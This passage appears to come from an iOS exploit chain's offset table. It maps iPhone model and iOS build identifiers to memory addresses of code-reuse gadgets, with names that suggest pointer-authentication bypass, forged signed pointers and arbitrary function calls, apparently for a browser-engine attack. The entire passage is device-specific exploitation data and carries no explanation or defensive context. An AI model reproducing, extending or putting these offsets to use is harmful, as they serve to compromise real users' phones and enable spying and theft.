      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26243b98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f039150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,1_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c921ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d1b98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f039150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,2_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c921ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d1b98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f039150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,3_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c919ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26197398cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed692ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f031150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,4_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c919ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26197398cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed692ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f031150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,5_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ef02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c915ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2616e198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed652ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02d150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },

   "iPhone11,2_4_6_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23abd402cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c61dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d6698cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef4e2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f007150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone11,8_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c5e1ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d5198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,1_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c625ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e3b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,3_5_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c625ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e3b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,8_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23aaba02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c53dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d8398cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ee302ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f007150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,1_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2610de98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,2_3_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26147598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,4_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26147598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,2_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ab02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26183b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed212ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,3_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ab02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26183b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed212ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,4_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c844ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2614a598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed1d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,5_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c844ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2614a598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed1d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,6_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a91f02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7b8ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26145098cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ec952ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,7_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9bb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c858ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26186198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed312ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,8_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9bb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c858ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26186198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed312ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,2_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c5398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,3_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c5398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,4_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618fb98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,5_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618fb98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone16,1_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d051ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26244f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
